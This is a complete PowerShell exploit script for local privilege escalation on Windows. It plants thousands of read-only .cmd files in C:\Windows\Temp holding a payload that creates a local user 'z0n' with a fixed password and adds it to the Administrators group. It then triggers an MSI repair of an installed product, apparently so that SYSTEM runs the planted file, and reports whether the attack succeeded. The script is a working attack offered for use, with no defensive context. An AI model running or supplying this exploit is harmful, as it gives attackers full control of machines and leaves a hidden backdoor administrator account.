# --- CONFIGURATION ---
# No IP needed! We are creating a local user.
$NewUser = "z0n"
$NewPass = "Password123!"

# --- 1. CLEANUP ---
Write-Host "[*] Cleaning up old files..."
Get-ChildItem "C:\Windows\Temp\cmk_*.cmd" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue

# --- 2. DEFINE PAYLOAD (Create Admin User) ---
# This command adds the user and puts them in the Admin group
$Payload = "net user $NewUser $NewPass /add & net localgroup Administrators $NewUser /add"

# --- 3. FIND MSI ---
Write-Host "[*] Finding MSI..."
$msi = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties' | Where-Object { $_.DisplayName -like '*mk*' } | Select-Object -First 1).LocalPackage
if (!$msi) { Write-Error "[-] MSI NOT FOUND"; exit }
Write-Host "[+] Found MSI: $msi"

# --- 4. SEED THE TRAP ---
Write-Host "[*] Seeding 15,000 files with Admin Create payload..."
1000..15000 | % {
    $f = "C:\Windows\Temp\cmk_all_$($_)_0.cmd"
    try {
        [IO.File]::WriteAllText($f, $Payload)
        Set-ItemProperty $f IsReadOnly $true
    } catch {}
}

# --- 5. TRIGGER ---
Write-Host "[*] Triggering execution..."
Start-Process "msiexec.exe" -ArgumentList "/fa `"$msi`" /qn"
Write-Host "[+] Exploit triggered. Waiting 5 seconds..."
Start-Sleep -Seconds 5

# --- 6. VERIFY ---
$Check = Get-LocalGroupMember -Group "Administrators" | Where-Object { $_.Name -like "*$NewUser*" }
if ($Check) {
    Write-Host "`n[+] SUCCESS! User '$NewUser' is now an Administrator." -ForegroundColor Green
    Write-Host "[+] Password: $NewPass"
} else {
    Write-Host "`n[-] Check failed. Try running the trigger again manually." -ForegroundColor Red
}
